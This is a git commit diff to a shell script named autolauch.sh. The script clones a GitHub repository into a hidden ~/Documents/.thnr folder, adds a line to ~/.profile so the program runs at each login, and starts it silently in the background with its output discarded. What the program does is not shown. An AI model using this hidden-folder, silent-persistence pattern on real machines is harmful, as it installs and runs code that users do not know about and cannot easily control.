858599e7ec96e4b6bb2319476fab784b3e3953c1
LucasTHOMAS18 <maitre.renardowo@gmail.com>
2024-11-12 16:19:20 +0100

    Fix

--- scripts/autolauch.sh
+++ scripts/autolauch.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr
-echo "python ~/Documents/.thnr/main.pyw true &" >> ~/.profile
-nohup python ~/Documents/.thnr/main.pyw true > /dev/null 2>&1 &
+git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr &&\
+echo "python ~/Documents/.thnr/main.pyw false &" >> ~/.profile &&\
+nohup python ~/Documents/.thnr/main.pyw false > /dev/null 2>&1 &
